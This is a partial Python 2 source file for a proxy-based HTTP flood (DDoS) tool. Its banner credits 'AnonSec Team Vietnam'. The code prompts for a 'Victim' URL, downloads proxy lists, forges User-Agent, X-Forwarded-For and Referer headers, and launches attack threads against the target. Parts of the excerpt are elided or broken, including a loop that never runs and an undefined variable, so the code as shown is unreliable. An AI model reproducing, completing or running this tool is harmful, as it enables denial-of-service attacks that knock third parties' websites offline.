...
def randomKeyWord():
    return random.choice(keyword_top)
...
class attacco(threading.Thread):
    ...
    def run(self):
        current = x
        if current < len(list_proxy):
            proxy = list_proxy[current].split(':')
        else:
            proxy = random.choice(list_proxy).split(':')
        useragent = 'User-Agent: ' + random.choice(headers_useragents) + '\r\n'
        forward = 'X-Forwarded-For: ' + random.choice(list_accept_encoding) + '\r\n'
        referer = 'Referer: ' + random.choice(headers_referers) + random.choice(keyword_top) + url + '?r=' + str(random.randint(1, 1000)) + '\r\n'
...
class DDos(threading.Thread):
    ...
    def run(self):
        ...
        while None:
            ...
            try:
                proxy_hulk = urllib2.ProxyHandler({
                    'http': proxy_JKL })
...
print '\t    .--.                      CODE DDOS BY ANONSEC TEAM VIETNAM'
print '\t   |o_o |               _   _  ____  _   _  _____ ______ _____ '
print '\t   |:_/ |         /\\   | \\ | |/ __ \\| \\ | |/ ____|  ____/ ____|'
print '\t  //   \\ \\       /  \\  |  \\| | |  | |  \\| | (___ | |__ | |     '
print '\t (|ANONSEC|)    / /\\ \\ | . ` | |  | | . ` |\\___ \\|  __|| |     '
print "\t /'\\_   _/`\\   / ____ \\| |\\  | |__| | |\\  |____) | |___| |     "
print '\t \\___)=(___/  /_/    \\_\\_| \\_|\\____/|_| \\_|_____/|______\\_____|'
url = raw_input('Victim: ')
host_url = url.replace('http://', '').replace('https://', '').split('/')[0]
proxyf = urllib.urlopen('http://multiproxy.org/txt_all/proxy.txt').read()
...
in_file3 = open('chu.txt', 'r')
keyword = in_file3.read()
in_file3.close()
list_keyword_top = keyword.split('\n')
in_file4 = open(raw_input('File proxy: '), 'r')
proxyf = in_file4.read()
in_file4.close()
port = raw_input('Port(80): ')
port = raw_input('Port(53): ')
list_proxy = proxyf.split('\n')
thread = int(input('So Luong: '))
